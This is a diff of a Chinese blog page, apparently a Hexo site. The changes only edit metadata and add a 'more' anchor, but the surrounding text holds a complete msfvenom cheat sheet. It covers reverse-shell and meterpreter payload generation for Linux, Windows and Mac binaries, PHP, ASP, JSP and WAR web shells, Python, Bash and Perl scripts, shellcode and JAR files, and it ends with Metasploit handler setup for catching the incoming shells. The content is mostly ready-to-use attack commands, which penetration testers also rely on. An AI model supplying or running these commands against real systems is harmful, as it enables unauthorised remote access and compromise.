@@ -12,18 +12,18 @@
   
 </title>
 
-<meta name="description" content="一些常用payload的生成命令，坑很多，这些还比较好用List payloadsmsfvenom -l   BinariesLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.">
+<meta name="description" content="一些常用payload的生成命令，坑很多，这些还比较好用">
 <meta name="keywords" content="msf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msfvenom生成各类Payload命令">
 <meta property="og:url" content="https://github.com/JackyTsuuuy/JackyTsuuuy.github.io/2017/02/26/msfvenom生成各类Payload命令/index.html">
 <meta property="og:site_name" content="A BLOG">
-<meta property="og:description" content="一些常用payload的生成命令，坑很多，这些还比较好用List payloadsmsfvenom -l   BinariesLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.">
+<meta property="og:description" content="一些常用payload的生成命令，坑很多，这些还比较好用">
 <meta property="og:locale" content="any">
-<meta property="og:updated_time" content="2018-02-27T09:21:44.610Z">
+<meta property="og:updated_time" content="2018-02-27T10:24:58.031Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msfvenom生成各类Payload命令">
-<meta name="twitter:description" content="一些常用payload的生成命令，坑很多，这些还比较好用List payloadsmsfvenom -l   BinariesLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.">
+<meta name="twitter:description" content="一些常用payload的生成命令，坑很多，这些还比较好用">
 <meta name="twitter:creator" content="@None">
 <link rel="publisher" href="None">
 <meta property="fb:admins" content="None">
@@ -182,7 +182,8 @@
 
   </div>
   <div class="article-entry">
-    <h3 id="一些常用payload的生成命令，坑很多，这些还比较好用"><a href="#一些常用payload的生成命令，坑很多，这些还比较好用" class="headerlink" title="一些常用payload的生成命令，坑很多，这些还比较好用"></a>一些常用payload的生成命令，坑很多，这些还比较好用</h3><p>List payloads<br>msfvenom -l  </p>
+    <h3 id="一些常用payload的生成命令，坑很多，这些还比较好用"><a href="#一些常用payload的生成命令，坑很多，这些还比较好用" class="headerlink" title="一些常用payload的生成命令，坑很多，这些还比较好用"></a>一些常用payload的生成命令，坑很多，这些还比较好用</h3><a id="more"></a>
+<p>List payloads<br>msfvenom -l  </p>
 <p>Binaries<br><strong>Linux</strong><br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code><br><strong>Windows</strong><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code><br><strong>Mac</strong><br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code><br>Web Payloads<br><strong>PHP</strong><br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code><br><strong>ASP</strong><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code><br><strong>JSP</strong><br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code><br><strong>WAR</strong><br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code><br>Scripting Payloads<br><strong>Python</strong><br><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code><br><strong>Bash</strong><br><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code><br><strong>Perl</strong><br><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code><br>Shellcode<br>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.<br><strong>Linux Based Shellcode</strong><br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code><br><strong>Windows Based Shellcode</strong><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code><br><strong>Mac Based Shellcode</strong><br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code><br><strong>Jar</strong><br><code>msfvenom --payload=&quot;java/meterpreter/reverse_tcp&quot; LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -t jar &gt; java_meterpreter_reverse_tcp.jar</code><br>Handlers<br>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.<br><code>use exploit/multi/handlerset PAYLOAD &lt;Payload name&gt;set LHOST &lt;LHOST value&gt;set LPORT &lt;LPORT value&gt;set ExitOnSession falseexploit -j -z</code><br>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p>
 
   </div>
